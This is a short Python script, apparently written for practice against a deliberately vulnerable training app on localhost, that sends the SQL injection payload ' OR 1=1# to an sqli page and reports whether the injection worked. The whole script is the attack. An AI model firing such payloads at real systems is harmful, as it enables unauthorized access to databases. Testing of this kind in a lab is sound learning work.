import requests

url = 'http://localhost/vulnerabilities/sqli/'
cookies = {
    'PHPSESSID': '1fgot79gju6seho1cc9qvj75c2', 
    'security': 'low'
}

payload = "' OR 1=1#"
params = {'id': payload, 'Submit': 'Submit'}

response = requests.get(url, params=params, cookies=cookies)

print(f"[i] Testing with payload: {payload}")

if "ID" in response.text:
    print("[+] Success: SQL Injection vulnerability exists!")
else:
    print("[-] Failure: SQL Injection not detected.")
